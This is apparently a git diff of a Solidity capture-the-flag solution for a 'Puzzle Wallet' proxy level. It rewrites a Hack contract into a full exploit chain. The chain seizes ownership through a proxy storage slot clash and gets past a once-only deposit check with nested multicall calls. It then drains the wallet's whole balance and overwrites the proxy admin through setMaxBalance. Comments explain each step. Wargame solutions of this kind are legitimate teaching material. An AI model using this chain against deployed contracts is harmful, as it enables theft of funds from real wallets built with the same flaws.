@@ -58,8 +58,6 @@ contract PuzzleProxy is UpgradeableProxy {
     }
 }
 
-//0x5B38Da6a701c568545dCfcB03FcB875f56beddC4,0xd9145CCE52D386f254917e481eB44e9943F39138,0x
-
 contract PuzzleWallet {
     using SafeMath for uint256;
     address public owner;
@@ -86,14 +84,6 @@ contract PuzzleWallet {
     function addToWhitelist(address addr) external {
         require(msg.sender == owner, "Not the owner");
         whitelisted[addr] = true;
-    }
-
-    function depositSenderCheck() external payable returns(address) {
-        return msg.sender;
-    }
-
-    function depositValueCheck() external payable returns(uint) {
-        return msg.value;
     }
     
     function deposit() external payable onlyWhitelisted {
@@ -158,47 +148,18 @@ interface ProxyI {
     function depositValueCheck() external payable returns(uint);
 }
 
-interface PuzzleI {
-    function setMaxBalance(uint256 _maxBalance) external;
-}
 
 contract Hack {
 
     ProxyI proxy;
-    PuzzleI puzzle;
     bytes[] data;
+    bytes[] mutliCallData;
 
-    constructor(address _proxy, address _puzzle) {
+    constructor(address _proxy) {
         proxy = ProxyI(_proxy);
-        puzzle = PuzzleI(_puzzle);
     }
 
-    function hack() public payable {
-        proxy.proposeNewAdmin(address(this));
-        proxy.addToWhitelist(address(this));
-        //proxy.deposit{value: msg.value}();
-    }
-
-    //0x0000000000000000000000000000000000000000000000000000000000000002
-    //00000000000000000000000000000000000000000000000000000000000000c
-    //0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000096465706f73697428290000000000000000000000000000000000000000000000
-
-    function depositAndWithdraw() public payable {
-        delete data;
-        data.push(abi.encodePacked("deposit()"));
-        data.push(abi.encodePacked("execute(address, uint256, bytes)", 0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7, uint256(100), ""));
-        proxy.multicall(data);
-    }
-
-    function d2epositAndWithdraw() public payable {
-        proxy.single(abi.encodePacked("deposit()"));
-    }
-
-    function deposit1() public payable {
-        proxy.deposit{value: msg.value}();
-    }
-    
-    function balances() public view returns(uint){
+    function getHackerBalance() public view returns(uint){
         return proxy.balances(address(this));
     }
 
@@ -206,15 +167,36 @@ contract Hack {
        return address(proxy).balance;
     }
 
-    function hack3b() public {
-        proxy.execute(0x03C6FcED478cBbC9a4FAB34eF9f40767739D1Ff7, 100, "");
+
+    function hack() public payable {
+        require(msg.value == getProxyBalance(), "msg value must be equal to proxy balance"); // we need to make sure we will empty the wallet at end of this hack 
+        takeOverAsOwner(); 
+        depositTwiceHack();
+        withdraw();
+        setMaxBalanceSlot();
     }
 
-    function hack3() public {
-        proxy.setMaxBalance(uint160(msg.sender));
+    function takeOverAsOwner() internal {   
+        proxy.proposeNewAdmin(address(this)); // will make you owner of wallet due to storage slot clash
+        proxy.addToWhitelist(address(this)); // Now you can add your address to whitelist
     }
 
-    function hack4() public {
-        puzzle.setMaxBalance(uint160(msg.sender));
+    function depositTwiceHack() internal {
+        delete data;
+        delete mutliCallData;
+        data.push(abi.encodeWithSignature("deposit()"));
+        // Multicall checks that deposit can be called only once, but doesn't check if multicall itself is called twice and allows multicall to also be called nested
+        mutliCallData.push(abi.encodeWithSignature("multicall(bytes[])", data));
+        mutliCallData.push(abi.encodeWithSignature("multicall(bytes[])", data));
+        (bool result,) = address(proxy).call{value: msg.value}(abi.encodeWithSignature("multicall(bytes[])", mutliCallData));
+        require(result, "EERRR");
+    }
+
+    function withdraw() internal {
+        proxy.execute(tx.origin, getProxyBalance(), "");
+    }
+     
+    function setMaxBalanceSlot() internal {
+        proxy.setMaxBalance(uint160(msg.sender)); // will make this address as owner of proxy due to storage slot clash
     }
 }
